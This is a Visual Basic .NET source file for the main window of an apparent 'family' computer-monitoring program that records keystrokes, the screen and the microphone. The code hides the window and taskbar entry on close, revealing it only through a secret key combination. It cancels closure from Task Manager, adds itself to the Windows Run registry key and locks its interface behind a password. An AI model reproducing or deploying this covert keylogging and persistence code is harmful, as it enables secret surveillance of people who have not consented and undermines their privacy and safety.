Imports Microsoft.Win32


Public Class MainWindow

    Private _IMSS_KEY_LOGGING_UINT As IMSS_KEY_LOGGER = IMSS_KEY_LOGGER._IMSS_CREATE_CONTROL()
    Private _IMSS_SCREEN_LOGGING_UINT As IMSS_SCREEN_LOGGER = IMSS_SCREEN_LOGGER._IMSS_CREATE_CONTROL()
    Private _IMSS_VOICE_LOGGING_UINT As IMSS_VOICE_LOGGER = IMSS_VOICE_LOGGER._IMSS_CREATE_CONTROL()
    Public Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call

        If My.Settings._IMSS_RunOnStartup = True Then
            _IMSS_RunOnStartUp.Checked = True
        Else
            _IMSS_RunOnStartUp.Checked = False
        End If

    End Sub
    Private _IMSS_EXIT_NACKGROUNDSYSTEMS As Boolean = False
    Public Sub _IMSS_RunBackgroundSystems()
        Do
            If IMSS_PATHS.getkey(17) And IMSS_PATHS.getkey(160) And IMSS_PATHS.getkey(83) Then
                _IMSS_EXIT_NACKGROUNDSYSTEMS = True
            End If
            System.Threading.Thread.Sleep(200)
        Loop Until _IMSS_EXIT_NACKGROUNDSYSTEMS = True
    End Sub

    Private Sub _IMSS_KeyBoreadLogger_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_KeyBoreadLogger.Click
        _IMSS_KeyLoggerPanel.Controls.Add(_IMSS_KEY_LOGGING_UINT)
    End Sub
    Private Sub _IMSS_ScreenLogger_Tap_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_ScreenLogger_Tap.Click
        _IMSS_ScreenLogger_Panel.Controls.Add(_IMSS_SCREEN_LOGGING_UINT)
    End Sub
    Private Sub _IMSS_VOUCRECORDER_TAP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_VOUCRECORDER_TAP.Click
        _IMSS_VOICERECORDER_Panel.Controls.Add(_IMSS_VOICE_LOGGING_UINT)
    End Sub

    Private _IMSS_STARTLOGGING_Click As Boolean = False
    Private Sub _IMSS_StartLogging_Button_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_StartLogging_Button.Click
        If _IMSS_STARTLOGGING_Click = False Then
            _IMSS_ResetControlsForLogging("Stop Logging", False)

            If _IMSS_KeyStrokes_CheckBox.Checked = True Then
                _IMSS_KEY_LOGGING_UINT._IMSS_LANUCH_KEY_LOGGING(False)
            End If

            If _IMSS_RecordScreen_CheckBox.Checked = True Then
                _IMSS_SCREEN_LOGGING_UINT._IMSS_LANUCH_SCREEN_LOGGING(False)
            End If

            If _IMSS_RecordVoice_CheckBox.Checked = True Then
                _IMSS_VOICE_LOGGING_UINT._IMSS_START_RECORD(True)
            End If

            _IMSS_StartLogging_Button.Image = My.Resources._IMSS_StopLogging_Icon_24x24
            _IMSS_STARTLOGGING_Click = True
        Else
            _IMSS_ResetControlsForLogging("Start Logging", True)

            If _IMSS_KeyStrokes_CheckBox.Checked = True Then
                _IMSS_KEY_LOGGING_UINT._IMSS_LANUCH_KEY_LOGGING(True)
            End If

            If _IMSS_RecordScreen_CheckBox.Checked = True Then
                _IMSS_SCREEN_LOGGING_UINT._IMSS_LANUCH_SCREEN_LOGGING(True)
            End If

            If _IMSS_RecordVoice_CheckBox.Checked = True Then
                _IMSS_VOICE_LOGGING_UINT._IMSS_START_RECORD(False)
            End If

            _IMSS_StartLogging_Button.Image = My.Resources._IMSS_StartLogging_Icon_24x24
            _IMSS_STARTLOGGING_Click = False
        End If
    End Sub
    Private Sub _IMSS_ResetControlsForLogging(ByVal _IMSS_TEXT_STATUS As String, ByVal _IMSS_ControlStatus As Boolean)
        _IMSS_StartLogging_Button.Text = _IMSS_TEXT_STATUS
        _IMSS_KeyStrokes_CheckBox.Enabled = _IMSS_ControlStatus
        _IMSS_RecordVoice_CheckBox.Enabled = _IMSS_ControlStatus
        _IMSS_RecordScreen_CheckBox.Enabled = _IMSS_ControlStatus
    End Sub

    Private _IMSS_THREAD As Threading.Thread = Nothing

    Private Sub MainWindow_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If e.CloseReason = CloseReason.UserClosing Then
            If Not IMSS_PATHS._IMSS_EXIT_COMMAND = True Then
                e.Cancel = True
                _IMSS_EXIT_NACKGROUNDSYSTEMS = False
                MessageBox.Show("To show main window again press (CTRL + SHIFT + S) !", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
                _IMSS_BACKGROUNDSYSTEMS_WORKER.RunWorkerAsync()
                Me.ShowInTaskbar = False
                Me.Hide()
            End If
        ElseIf e.CloseReason = CloseReason.TaskManagerClosing Then
            e.Cancel = True
            _IMSS_EXIT_NACKGROUNDSYSTEMS = True
        ElseIf e.CloseReason = CloseReason.WindowsShutDown Then
            _IMSS_Exit_Button.PerformClick()
        End If
    End Sub

    Private Sub _IMSS_BACKGROUNDSYSTEMS_WORKER_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles _IMSS_BACKGROUNDSYSTEMS_WORKER.DoWork
        _IMSS_RunBackgroundSystems()
    End Sub

    Private Sub _IMSS_BACKGROUNDSYSTEMS_WORKER_RunWorkerCompleted(ByVal sender As Object, ByVal e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles _IMSS_BACKGROUNDSYSTEMS_WORKER.RunWorkerCompleted
        If _IMSS_EXIT_NACKGROUNDSYSTEMS = True Then
            IMSS_UNLOCK._IMSS_PASSWORD_TextBox.Clear()
            IMSS_UNLOCK.Show()
            IMSS_UNLOCK.Focus()
            IMSS_UNLOCK.Activate()
            _IMSS_EXIT_NACKGROUNDSYSTEMS = False
        End If
    End Sub

    Private Sub _IMSS_EditPassword_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles _IMSS_EditPassword.LinkClicked
        Dim _IMSS_REGISTER As New IMSS_REGISTER
        _IMSS_REGISTER._IMSS_EDIT_PASSWORD = True
        _IMSS_REGISTER.Text = "Edit Password"
        _IMSS_REGISTER._IMSS_PasswordDescription.Text = "Please insert your new password !"
        _IMSS_REGISTER._IMSS_REGISTER.Text = "Save"
        _IMSS_REGISTER.ShowDialog()
    End Sub

    Private Sub _IMSS_RunOnStartUp_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_RunOnStartUp.CheckedChanged
        If _IMSS_RunOnStartUp.Checked = True Then
            _IMSS_AddValuetoRegistryStartUp(True)
        Else
            _IMSS_AddValuetoRegistryStartUp(False)
        End If
    End Sub

    Private Sub _IMSS_AddValuetoRegistryStartUp(ByVal _IMSS_STATUS As Boolean)
        If _IMSS_STATUS = True Then
            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "IMSSFKLOGGER", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\iMyth Security Systems\All functions\IMSS Family Computerlogger.exe", Microsoft.Win32.RegistryValueKind.String)
                My.Settings._IMSS_RunOnStartup = _IMSS_STATUS
            Catch ex As Exception
                MessageBox.Show(ex.Message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            End Try
        Else
            Try
                With My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    .DeleteValue("IMSSFKLOGGER")
                End With
                My.Settings._IMSS_RunOnStartup = _IMSS_STATUS
            Catch ex As Exception
                MessageBox.Show(ex.Message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            End Try
        End If : My.Settings.Save()
    End Sub

    Private Sub _IMSS_Exit_Button_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_Exit_Button.Click
        IMSS_PATHS._IMSS_EXIT_COMMAND = True
        IMSS_UNLOCK.Close()
        If _IMSS_STARTLOGGING_Click = True Then
            _IMSS_StartLogging_Button.PerformClick()
        End If
        Application.Exit()
    End Sub
End Class
